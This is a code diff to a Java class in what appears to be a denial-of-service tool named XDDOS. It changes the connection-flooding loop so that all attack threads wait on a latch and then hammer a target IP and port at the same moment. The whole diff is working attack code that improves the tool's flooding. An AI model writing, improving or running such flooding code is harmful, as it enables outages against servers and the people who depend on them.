@@ -16,6 +16,7 @@ import io.netty.util.ResourceLeakDetector;
 import io.netty.util.concurrent.Future;
 import io.netty.util.concurrent.GenericFutureListener;
 import java.net.InetAddress;
+import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.ThreadFactory;
 
 import XD.XDDOS.XDDOS;
@@ -147,12 +148,19 @@ public class NettyBootstrap {
             System.out.println("Attack finished!");
             System.exit(0);
         });
+
         Counter.setPriority(1);
-        Counter.start();
+
+        CountDownLatch latch = new CountDownLatch(1);
         int k;
         if (XDDOS.targetCPS == -1) {
             for(k = 0; k < XDDOS.loopThreads; ++k) {
                 attack = new Thread(() -> {
+                    try {
+                        latch.await();
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
                     while(true) {
                         ++triedCPS;
                         bootstrap.connect(ip, port);
@@ -163,6 +171,11 @@ public class NettyBootstrap {
         } else {
             for(k = 0; k < XDDOS.loopThreads; ++k) {
                 attack = new Thread(() -> {
+                    try {
+                        latch.await();
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
                     while(true) {
                         for(int j = 0; j < XDDOS.targetCPS / XDDOS.loopThreads / 10; ++j) {
                             ++triedCPS;
@@ -174,11 +187,13 @@ public class NettyBootstrap {
                         } catch (InterruptedException var3) {
                         }
                     }
-                });
+                });      
                 attack.start();
             }
         }
 
-
+        Counter.start();
+        latch.countDown();
+        
     }
 }
